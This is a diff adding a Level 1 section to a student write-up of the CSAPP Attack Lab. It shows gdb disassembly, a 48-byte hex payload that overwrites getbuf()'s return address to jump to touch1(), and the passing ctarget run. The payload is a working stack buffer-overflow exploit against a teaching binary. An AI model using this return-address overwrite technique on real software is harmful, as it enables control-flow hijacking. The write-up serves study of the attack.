@@ -80,6 +80,40 @@ Note that your exploit string may also corrupt parts of the stack not directly r
 
 In this lab, we don't need to injection any code into the program, rather, all the thing we need to do is by using the vulnerability of `getbuf()` to change target the address of `ret` in the stack frame of `getbuf()`, where replace the address of `test()` with `touch1()`.
 
+Just like what we saw in the description of **code injection attack**, the thing we need to do is overwitten the return address of `getbuf()` to make it not jump back to the funciton `test()`. Rather, jump to the function `touch1()`.
+
+For more detail, let's look the assembly code of `getbuf()` (In `ctarget`):
+
+```asm
+(gdb) disas getbuf Dump of assembler code for function getbuf:   0x00000000004017a8 <+0>:	sub    $0x28,%rsp   0x00000000004017ac <+4>:	mov    %rsp,%rdi   0x00000000004017af <+7>:	callq  0x401a40 <Gets>   0x00000000004017b4 <+12>:	mov    $0x1,%eax   0x00000000004017b9 <+17>:	add    $0x28,%rsp   0x00000000004017bd <+21>:	retq   End of assembler dump.
+```
+As the code shown us, the function `getbuf()` request 0x28 (40 in Decimal) bytes spaces for the input buffer, and then return back the to the `test()`. Note that there is no arguement passed into `getbuf()`. Thus, we can make sure that if our input string longer than 40, then we can overwrite the return area of `getbuf()`. Since we are using 64-bit machine, **the length of return address should be 8 bytes.** Also, we pass the target address as a data, and thus it should follow the **order of little endian**.
+
+Moreover, we can get the adderss of `touch1()` by seeing its assembly code, which is `0x4017c0`.
+
+```asm
+(gdb) disas touch1 Dump of assembler code for function touch1:   0x00000000004017c0 <+0>:	sub    $0x8,%rsp ; the begin address of touch1()   0x00000000004017c4 <+4>:	movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>   0x00000000004017ce <+14>:	mov    $0x4030c5,%edi   0x00000000004017d3 <+19>:	callq  0x400cc0 <puts@plt>   0x00000000004017d8 <+24>:	mov    $0x1,%edi   0x00000000004017dd <+29>:	callq  0x401c8d <validate>   0x00000000004017e2 <+34>:	mov    $0x0,%edi   0x00000000004017e7 <+39>:	callq  0x400e40 <exit@plt>End of assembler dump.(gdb) 
+```
+
+Here is our code injection payload:
+
+```
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 <- the last position of buffer
+c0 17 40 00 00 00 00 00 <- the postion of we want to overwrite ( the position of rsp)
+```
+Finally, we need to use the program `hex2raw` to convert our input string to the real binary attach string.
+
+we have successfully made the program jump to `touch 1()` in the final.
+
+```bash
+➜  ~/cmu-15-213-CSAPP3E-lab/3.Attack_lab/target1 ./hex2raw < solutions/CI_Level1.txt | ./ctarget -q Cookie: 0x59b997faType string:Touch1!: You called touch1()Valid solution for level 1 with target ctargetPASS: Would have posted the following:	user id	bovik	course	15213-f15	lab	attacklab	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+	00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 
+```
+
 ### 1.2 Level 2
 
 
